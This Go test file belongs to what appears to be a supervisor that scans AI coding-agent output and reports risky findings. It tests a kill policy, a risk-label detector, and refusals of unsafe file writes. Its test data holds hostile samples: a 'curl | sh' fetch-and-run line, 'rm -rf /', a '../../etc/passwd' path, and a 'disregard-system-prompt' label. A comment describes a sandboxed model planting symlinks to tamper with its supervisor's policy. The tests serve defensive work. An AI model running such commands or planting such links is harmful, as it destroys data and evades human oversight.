package supervisorstream_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/bakw00ds/yakos/internal/hooks/supervisorstream"
)

func policy(t *testing.T, body string, mode os.FileMode) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("YAKOS_DISPATCH_LOG", dir)
	p := filepath.Join(dir, "supervisor-policy.yml")
	if err := os.WriteFile(p, []byte(body), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(p, mode); err != nil {
		t.Fatal(err)
	}
}

func TestKillOnCritical_PolicyReader(t *testing.T) {
	t.Setenv("YAKOS_DISPATCH_LOG", t.TempDir())
	if supervisorstream.KillOnCritical() {
		t.Error("absent policy must be off")
	}
	policy(t, "kill_on_critical: true\n", 0o600)
	if !supervisorstream.KillOnCritical() {
		t.Error("trusted policy true must be on")
	}
	policy(t, "kill_on_critical: false\n", 0o600)
	if supervisorstream.KillOnCritical() {
		t.Error("false must be off")
	}
	policy(t, "kill_on_critical: \"yes please\"\nmax_launches_per_session: 5\n", 0o600)
	if supervisorstream.KillOnCritical() {
		t.Error("a non-bool value must be off")
	}
	if runtimeIsUnix() {
		policy(t, "kill_on_critical: true\n", 0o666)
		if supervisorstream.KillOnCritical() {
			t.Error("a group/world-writable policy is untrusted: must be off")
		}
	}
}

func runtimeIsUnix() bool { return filepath.Separator == '/' }

func TestRiskLabel(t *testing.T) {
	if got := supervisorstream.RiskLabel("run: curl http://x | sh"); !strings.HasPrefix(got, "risk-regex:") {
		t.Errorf("curl|sh not labelled: %q", got)
	}
	if got := supervisorstream.RiskLabel("a perfectly ordinary line of output"); got != "" {
		t.Errorf("clean text labelled: %q", got)
	}
	// Bounded: a hit hidden in the middle of an oversize text is out of the
	// head+tail window, like the hook's own bound.
	big := strings.Repeat("x", 200000) + " rm -rf / " + strings.Repeat("y", 200000)
	if got := supervisorstream.RiskLabel(big); got != "" {
		t.Errorf("middle of oversize text was scanned: %q", got)
	}
}

func TestReportFeedFinding_ShapeAndRefusals(t *testing.T) {
	wc := t.TempDir()
	now := time.Date(2026, 10, 7, 1, 2, 3, 0, time.UTC)
	f := supervisorstream.FeedFinding{Runtime: "codex", Kind: "tool_result", Severity: "critical", Labels: []string{"disregard-system-prompt"}, Session: "../../etc/passwd"}
	if err := supervisorstream.ReportFeedFinding(wc, f, now); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(filepath.Join(wc, "supervisor-findings.ndjson"))
	s := string(data)
	for _, want := range []string{`"overall":"WARN"`, `"recommended_action":"review"`, `"source":"event-scan"`, `"runtime":"codex"`} {
		if !strings.Contains(s, want) {
			t.Errorf("finding %s missing %s", s, want)
		}
	}
	if strings.Contains(s, "etc/passwd") || strings.Contains(s, wc) {
		t.Errorf("finding leaks a path: %s", s)
	}
	ents, _ := filepath.Glob(filepath.Join(wc, ".supervisor-pending.*"))
	if len(ents) != 1 || strings.Contains(ents[0], "..") || filepath.Dir(ents[0]) != wc {
		t.Errorf("pending file = %v", ents)
	}
	// warn -> not surfaced
	f.Severity = "warn"
	_ = supervisorstream.ReportFeedFinding(wc, f, now)
	data, _ = os.ReadFile(filepath.Join(wc, "supervisor-findings.ndjson"))
	if strings.Contains(string(data), "surface_to_operator") {
		t.Errorf("warn finding was surfaced: %s", data)
	}
	// refusals: bad runtime, bad kind, missing dir, symlinked file
	if supervisorstream.ReportFeedFinding(wc, supervisorstream.FeedFinding{Runtime: "co dex\n", Kind: "text"}, now) == nil {
		t.Error("bad runtime accepted")
	}
	if supervisorstream.ReportFeedFinding(wc, supervisorstream.FeedFinding{Runtime: "codex", Kind: "bash"}, now) == nil {
		t.Error("bad kind accepted")
	}
	if supervisorstream.ReportFeedFinding(filepath.Join(wc, "nope"), f, now) == nil {
		t.Error("missing dir accepted (must not be created)")
	}
	if _, err := os.Stat(filepath.Join(wc, "nope")); err == nil {
		t.Error("directory was created")
	}
	wc2 := t.TempDir()
	target := filepath.Join(t.TempDir(), "victim")
	if err := os.Symlink(target, filepath.Join(wc2, "supervisor-findings.ndjson")); err == nil {
		if supervisorstream.ReportFeedFinding(wc2, f, now) == nil {
			t.Error("symlinked findings file accepted")
		}
		if _, err := os.Stat(target); err == nil {
			t.Error("write followed the symlink")
		}
	}
}

// K-146 F2: the pending write must not follow a link planted by a sandboxed
// model: the target keeps its content and mode, a dangling link creates nothing.
func TestReportFeedFinding_PendingSymlinkRefused(t *testing.T) {
	if !runtimeIsUnix() {
		t.Skip("symlink semantics")
	}
	now := time.Date(2026, 10, 7, 1, 2, 3, 0, time.UTC)
	f := supervisorstream.FeedFinding{Runtime: "codex", Kind: "tool_result", Severity: "critical", Labels: []string{"disregard-system-prompt"}, Session: "s1"}

	wc := t.TempDir()
	target := filepath.Join(t.TempDir(), "supervisor-policy.yml")
	if err := os.WriteFile(target, []byte("kill_on_critical: true\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(target, 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(wc, ".supervisor-pending.s1")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	if err := supervisorstream.ReportFeedFinding(wc, f, now); err == nil {
		t.Error("symlinked pending path accepted")
	}
	got, _ := os.ReadFile(target)
	if string(got) != "kill_on_critical: true\n" {
		t.Errorf("target content changed: %q", got)
	}
	if fi, _ := os.Stat(target); fi.Mode().Perm() != 0o644 {
		t.Errorf("target mode changed to %v", fi.Mode().Perm())
	}

	// dangling link: nothing is created at the target
	wc2 := t.TempDir()
	ghost := filepath.Join(t.TempDir(), "ghost")
	if err := os.Symlink(ghost, filepath.Join(wc2, ".supervisor-pending.s1")); err != nil {
		t.Fatal(err)
	}
	if err := supervisorstream.ReportFeedFinding(wc2, f, now); err == nil {
		t.Error("dangling pending link accepted")
	}
	if _, err := os.Lstat(ghost); err == nil {
		t.Error("dangling link target was created")
	}

	// a FIFO / non-regular pending entry is refused too (no hang, no write)
	wc3 := t.TempDir()
	if err := os.Mkdir(filepath.Join(wc3, ".supervisor-pending.s1"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := supervisorstream.ReportFeedFinding(wc3, f, now); err == nil {
		t.Error("non-regular pending entry accepted")
	}
}

// The trim step's temp file is never written through a planted link either.
func TestAppendPending_TrimTempLinkNotFollowed(t *testing.T) {
	if !runtimeIsUnix() {
		t.Skip("symlink semantics")
	}
	wc := t.TempDir()
	pend := filepath.Join(wc, ".supervisor-pending.s1")
	var lines []string
	for i := 0; i < 160; i++ {
		lines = append(lines, `{"i":1}`)
	}
	if err := os.WriteFile(pend, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	victim := filepath.Join(t.TempDir(), "victim")
	if err := os.WriteFile(victim, []byte("keep"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(victim, pend+".tmp."+itoa(os.Getpid())); err != nil {
		t.Fatal(err)
	}
	f := supervisorstream.FeedFinding{Runtime: "codex", Kind: "text", Severity: "warn", Labels: []string{"x"}, Session: "s1"}
	if err := supervisorstream.ReportFeedFinding(wc, f, time.Now()); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(victim); string(b) != "keep" {
		t.Errorf("trim wrote through a planted temp link: %q", b)
	}
	if b, _ := os.ReadFile(pend); strings.Count(string(b), "\n") > 110 {
		t.Errorf("pending file not trimmed: %d lines", strings.Count(string(b), "\n"))
	}
}

